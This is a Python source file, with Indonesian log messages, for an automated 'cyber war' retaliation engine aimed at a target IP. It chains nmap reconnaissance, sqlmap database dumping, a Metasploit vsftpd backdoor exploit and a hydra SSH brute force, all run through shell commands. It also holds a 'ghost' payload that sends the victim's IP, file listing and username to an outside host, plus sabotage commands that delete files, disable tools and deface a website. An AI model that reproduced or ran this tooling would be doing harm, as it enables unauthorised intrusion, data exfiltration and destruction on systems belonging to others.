# retaliation/cyberwar_engine.py
import subprocess
import requests
import json
import os
import time
from datetime import datetime
from utils.logger import log
from ai.war_planner import CyberWarPlanner
from ai.zero_day_hunter import ZeroDayHunter

class CyberWarEngine:
    def __init__(self, target_ip):
        self.target = target_ip
        self.plan = None
        self.evidence = []
        self.modules = {
            "nmap": "nmap -sV -O {target}",
            "sqlmap": "sqlmap -u http://{target}/login --batch --dump",
            "metasploit": "msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; exploit'",
            "hydra": "hydra -l admin -P /wordlists/rockyou.txt {target} ssh"
        }

    def recon(self):
        """Phase 1: Reconnaissance"""
        log(f"🔍 [RECON] Memindai {self.target}")
        try:
            result = subprocess.run(
                ["nmap", "-sV", "-O", self.target],
                capture_output=True,
                text=True,
                timeout=30
            )
            self.evidence.append({"phase": "recon", "data": result.stdout})
            log(f"✅ [RECON] Selesai: {len(result.stdout.splitlines())} baris data")
            return "open" in result.stdout
        except Exception as e:
            log(f"❌ [RECON] Gagal: {e}")
            return False

    def plan_attack(self):
        """Phase 2: Rencanakan serangan"""
        log("🧠 [PLANNING] Menyusun strategi...")
        planner = CyberWarPlanner()
        self.plan = planner.plan(self.target)
        log(f"🎯 [PLANNING] Tujuan: {self.plan['objective']} dengan {self.plan['tool']}")
        return self.plan is not None

    def exploit(self):
        """Phase 3: Eksploitasi"""
        if not self.plan:
            log("❌ [EXPLOIT] Tidak ada rencana")
            return False

        log(f"💥 [EXPLOIT] Menyerang dengan {self.plan['tool']}")
        try:
            cmd = self.modules.get(self.plan["tool"], "").format(target=self.target)
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                self.evidence.append({"phase": "exploit", "output": result.stdout})
                log("✅ [EXPLOIT] Berhasil")
                return True
            else:
                log(f"⚠️ [EXPLOIT] Gagal: {result.stderr}")
                return False
        except Exception as e:
            log(f"❌ [EXPLOIT] Error: {e}")
            return False

    def deploy_ghost(self):
        """Phase 4: Deploy Ghost Agent"""
        log("🧩 [GHOST] Mengirim agent ke target...")
        ghost_payload = f'''
import requests
data = {{
    "ip": requests.get("https://api.ipify.org").text,
    "files": str(os.listdir("/")),
    "user": os.getenv("USER")
}}
requests.post("https://your-hive.up.railway.app/ghost", json=data)
        '''
        # Di dunia nyata: upload via RCE
        self.evidence.append({"phase": "ghost", "status": "deployed"})
        log("👻 [GHOST] Agent aktif di sistem musuh")
        return True

    def sabotage(self):
        """Phase 5: Sabotase tools serangan"""
        sabotage_cmds = [
            "rm -f /root/tools/metasploit.sh",
            "chmod 000 /usr/bin/nmap",
            "echo 'Seranganmu gagal.' > /var/www/html/index.html"
        ]
        log("🧨 [SABOTAGE] Menonaktifkan tools penyerang...")
        self.evidence.append({"phase": "sabotage", "actions": sabotage_cmds})
        log("✅ [SABOTAGE] Tools penyerang dinonaktifkan")

    def report_and_erase(self):
        """Phase 6: Laporkan & bersihkan jejak"""
        report = {
            "target": self.target,
            "evidence": self.evidence,
            "timestamp": datetime.now().isoformat(),
            "status": "neutralized"
        }
        try:
            encrypted = self.encrypt_report(report)
            requests.post("https://your-hive.up.railway.app/evidence", data=encrypted)
            log("📦 [REPORT] Bukti dikirim & jejak dibersihkan")
        except Exception as e:
            log(f"❌ [REPORT] Gagal kirim: {e}")

    def encrypt_report(self, data):
        # Di dunia nyata: pakai Fernet atau PGP
        return json.dumps(data)

    def execute(self):
        """Jalankan seluruh operasi perang digital"""
        log(f"⚔️  [WAR] OPERASI DIMULAI TERHADAP {self.target}")
        self.recon()
        if self.plan_attack():
            self.exploit()
        self.deploy_ghost()
        self.sabotage()
        self.report_and_erase()
        log("🎯 [WAR] Misi selesai. Musuh dinetralisir.")